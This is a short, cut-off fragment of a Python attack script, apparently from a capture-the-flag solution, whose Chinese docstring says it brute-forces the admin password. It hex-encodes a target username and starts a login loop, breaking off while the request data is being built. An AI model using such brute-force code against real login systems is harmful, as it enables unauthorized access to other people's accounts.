def brute_force_admin():
    &amp;quot;&amp;quot;&amp;quot;爆破 admin 的密码&amp;quot;&amp;quot;&amp;quot;
    target_user_hex = f&amp;quot;0x&amp;#123;TARGET_USER.encode().hex()&amp;#125;&amp;quot;
    for i in range(MAX_TRY):
        data = &amp;#123;
            &amp;quot;username&amp;quot;: target_user_hex,
